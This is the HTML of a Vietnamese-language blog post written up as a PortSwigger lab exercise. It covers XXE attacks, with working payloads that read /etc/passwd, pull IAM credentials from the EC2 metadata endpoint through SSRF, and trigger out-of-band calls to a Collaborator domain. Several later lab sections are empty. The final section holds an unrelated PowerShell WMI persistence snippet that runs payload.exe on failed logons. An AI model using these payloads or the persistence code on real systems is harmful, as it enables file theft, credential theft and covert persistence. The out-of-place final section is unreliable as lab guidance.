@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>PortSwigger - XXE - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/portswigger---xxe/">
+  <meta property="og:site_name" content="g03m0n">
+  <meta property="og:title" content="PortSwigger - XXE">
+  <meta property="og:description" content="Description Link lab tại đâyThis lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
+Exploitation Ứng dụng có chức năng kiểm tra hàng tồn kho tại mỗi post của sản phẩm
+Khi click Check stock, một POST request gửi đến /product/stock với body là một dạng XML gồm 2 trường query chính là productId và storeId.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-08-21T08:29:01+08:00">
+    <meta property="article:modified_time" content="2023-08-21T08:29:01+08:00">
+    <meta property="article:tag" content="Lab">
+    <meta property="article:tag" content="Ctf">
+    <meta property="og:image" content="https://g03m0n.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://g03m0n.github.io/logo.png">
+  <meta name="twitter:title" content="PortSwigger - XXE">
+  <meta name="twitter:description" content="Description Link lab tại đâyThis lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
+Exploitation Ứng dụng có chức năng kiểm tra hàng tồn kho tại mỗi post của sản phẩm
+Khi click Check stock, một POST request gửi đến /product/stock với body là một dạng XML gồm 2 trường query chính là productId và storeId.">
+<meta name="application-name" content="g03m0n">
+<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/portswigger---xxe/" /><link rel="prev" href="https://g03m0n.github.io/posts/vulhub---mrrobot/" /><link rel="next" href="https://g03m0n.github.io/posts/hackthebox---jscalc/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PortSwigger - XXE",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/g03m0n.github.io\/posts\/portswigger---xxe\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "lab, ctf","wordcount":  579 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/portswigger---xxe\/","datePublished": "2023-08-21T08:29:01+08:00","dateModified": "2023-08-21T08:29:01+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "g03m0n"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PortSwigger - XXE</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/portswigger/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PortSwigger</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-21">2023-08-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;579 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#description-1">Description</a></li>
+    <li><a href="#exploitation-1">Exploitation</a></li>
+    <li><a href="#3-blind-xxe-with-out-of-band-interaction">3. Blind XXE with out-of-band interaction</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#exploitation-2">Exploitation</a></li>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#exploitation-3">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#description-4">Description</a></li>
+    <li><a href="#exploitation-4">Exploitation</a></li>
+    <li><a href="#description-5">Description</a></li>
+    <li><a href="#exploitation-5">Exploitation</a></li>
+    <li><a href="#description-6">Description</a></li>
+    <li><a href="#exploitation-6">Exploitation</a></li>
+    <li><a href="#description-7">Description</a></li>
+    <li><a href="#exploitation-7">Exploitation</a></li>
+    <li><a href="#description-8">Description</a></li>
+    <li><a href="#exploitation-8">Exploitation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="description">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.</p>
+</blockquote>
+<h2 id="exploitation">Exploitation</h2>
+<p>Ứng dụng có chức năng kiểm tra hàng tồn kho tại mỗi post của sản phẩm</p>
+<p>Khi click <code>Check stock</code>, một POST request gửi đến <code>/product/stock</code> với body là một dạng XML gồm 2 trường query chính là <code>productId</code> và <code>storeId</code>. Server sẽ trả về số lượng sản phẩm còn lại trong kho.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/9712a902-af1f-41f4-a249-e16ac74f7da0"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9712a902-af1f-41f4-a249-e16ac74f7da0, https://github.com/g03m0n/pics/assets/130943529/9712a902-af1f-41f4-a249-e16ac74f7da0 1.5x, https://github.com/g03m0n/pics/assets/130943529/9712a902-af1f-41f4-a249-e16ac74f7da0 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/9712a902-af1f-41f4-a249-e16ac74f7da0"
+        title="image" /></p>
+<p>Tại đây, server không có một cơ chế <code>validate</code> XML nào nên ta có thể định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là nội dung file <code>/etc/passwd</code> và sử dụng <code>entity</code> <code>&amp;xxe;</code> tại trường <code>productId</code>.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/65745beb-6cc5-4b54-b22e-aedb0ee79812"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/65745beb-6cc5-4b54-b22e-aedb0ee79812, https://github.com/g03m0n/pics/assets/130943529/65745beb-6cc5-4b54-b22e-aedb0ee79812 1.5x, https://github.com/g03m0n/pics/assets/130943529/65745beb-6cc5-4b54-b22e-aedb0ee79812 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/65745beb-6cc5-4b54-b22e-aedb0ee79812"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/ea872258-7363-40c8-81ae-abf8816419a9"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/ea872258-7363-40c8-81ae-abf8816419a9, https://github.com/g03m0n/pics/assets/130943529/ea872258-7363-40c8-81ae-abf8816419a9 1.5x, https://github.com/g03m0n/pics/assets/130943529/ea872258-7363-40c8-81ae-abf8816419a9 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/ea872258-7363-40c8-81ae-abf8816419a9"
+        title="image" /></p>
+<h2 id="description-1">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
+The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server&rsquo;s IAM secret access key from the EC2 metadata endpoint.</p>
+</blockquote>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Tương tự bài trên, ta sẽ thực hiện <code>SSRF attack</code> để định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là <code>http://169.254.169.254/</code> và sử dụng <code>entity</code> tại trường <code>productId</code>.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/2e30f12a-1aae-4fc2-8ac4-9939e0afbd72"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/2e30f12a-1aae-4fc2-8ac4-9939e0afbd72, https://github.com/g03m0n/pics/assets/130943529/2e30f12a-1aae-4fc2-8ac4-9939e0afbd72 1.5x, https://github.com/g03m0n/pics/assets/130943529/2e30f12a-1aae-4fc2-8ac4-9939e0afbd72 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/2e30f12a-1aae-4fc2-8ac4-9939e0afbd72"
+        title="image" /></p>
+<p>Tìm ra được folder <code>latest</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/7ec35c7a-2c19-49f9-a087-77905f969aa3"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7ec35c7a-2c19-49f9-a087-77905f969aa3, https://github.com/g03m0n/pics/assets/130943529/7ec35c7a-2c19-49f9-a087-77905f969aa3 1.5x, https://github.com/g03m0n/pics/assets/130943529/7ec35c7a-2c19-49f9-a087-77905f969aa3 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/7ec35c7a-2c19-49f9-a087-77905f969aa3"
+        title="image" /></p>
+<p>Sử dụng đường dẫn trên kết hợp với folder <code>latest</code> ta được:</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/d095b065-d984-437e-9c26-eae8fddd6403"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/d095b065-d984-437e-9c26-eae8fddd6403, https://github.com/g03m0n/pics/assets/130943529/d095b065-d984-437e-9c26-eae8fddd6403 1.5x, https://github.com/g03m0n/pics/assets/130943529/d095b065-d984-437e-9c26-eae8fddd6403 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/d095b065-d984-437e-9c26-eae8fddd6403"
+        title="image" /></p>
+<p>Lặp đi lặp lại các bước ta tìm ra được endpoint <code>admin</code>: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/ad5d79cc-6c5c-4112-96ba-ce547c3b575c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/ad5d79cc-6c5c-4112-96ba-ce547c3b575c, https://github.com/g03m0n/pics/assets/130943529/ad5d79cc-6c5c-4112-96ba-ce547c3b575c 1.5x, https://github.com/g03m0n/pics/assets/130943529/ad5d79cc-6c5c-4112-96ba-ce547c3b575c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/ad5d79cc-6c5c-4112-96ba-ce547c3b575c"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/165bc58d-451f-4c65-a0c9-11daec9ac18d"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/165bc58d-451f-4c65-a0c9-11daec9ac18d, https://github.com/g03m0n/pics/assets/130943529/165bc58d-451f-4c65-a0c9-11daec9ac18d 1.5x, https://github.com/g03m0n/pics/assets/130943529/165bc58d-451f-4c65-a0c9-11daec9ac18d 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/165bc58d-451f-4c65-a0c9-11daec9ac18d"
+        title="image" /></p>
+<h2 id="3-blind-xxe-with-out-of-band-interaction">3. Blind XXE with out-of-band interaction</h2>
+<h3 id="description-2">Description</h3>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input but does not display the result.
+You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
+To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Đây là một bài lab <code>Blind XXE injection</code>, server không trả về kết quả attacker mong muốn. Vì vậy ta có thể sử dụng kĩ thuật <code>out-of-band</code> sau để tiến hành khai thác.
+Payload</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;http://&lt;COLABORATOR_DOMAIN&gt;&#34;&gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/441f9e79-d0b4-4168-b26e-3946079254ce"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/441f9e79-d0b4-4168-b26e-3946079254ce, https://github.com/g03m0n/pics/assets/130943529/441f9e79-d0b4-4168-b26e-3946079254ce 1.5x, https://github.com/g03m0n/pics/assets/130943529/441f9e79-d0b4-4168-b26e-3946079254ce 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/441f9e79-d0b4-4168-b26e-3946079254ce"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/36b59f00-1da7-4048-ade0-3574b97cf1d9"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/36b59f00-1da7-4048-ade0-3574b97cf1d9, https://github.com/g03m0n/pics/assets/130943529/36b59f00-1da7-4048-ade0-3574b97cf1d9 1.5x, https://github.com/g03m0n/pics/assets/130943529/36b59f00-1da7-4048-ade0-3574b97cf1d9 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/36b59f00-1da7-4048-ade0-3574b97cf1d9"
+        title="image" /></p>
+<h3 id="description-3">Description</h3>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h3 id="exploitation-3">Exploitation</h3>
+<h2 id="description-4">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-4">Exploitation</h2>
+<h2 id="description-5">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-5">Exploitation</h2>
+<h2 id="description-6">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-6">Exploitation</h2>
+<h2 id="description-7">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-7">Exploitation</h2>
+<h2 id="description-8">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-8">Exploitation</h2>
+<p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-08-21</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/portswigger---xxe/" data-title="PortSwigger - XXE" data-hashtags="lab,ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/portswigger---xxe/" data-hashtag="lab"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/portswigger---xxe/" data-title="PortSwigger - XXE"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/lab/">Lab</a>,&nbsp;<a href="/tags/ctf/">Ctf</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/vulhub---mrrobot/" class="prev" rel="prev" title="Vulhub - Mr.Robot"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Vulhub - Mr.Robot</a>
+            <a href="/posts/hackthebox---jscalc/" class="next" rel="next" title="Hackthebox - jscalc">Hackthebox - jscalc<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="fb-root" class="comment"></div>
+            <div
+                class="fb-comments"
+                data-href="https://g03m0n.github.io/posts/portswigger---xxe/"
+                data-width="100%"
+                data-numposts="10"
+            ></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
+            </noscript><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.2">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=2950291851778582&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/mhchem.min.js"></script><script 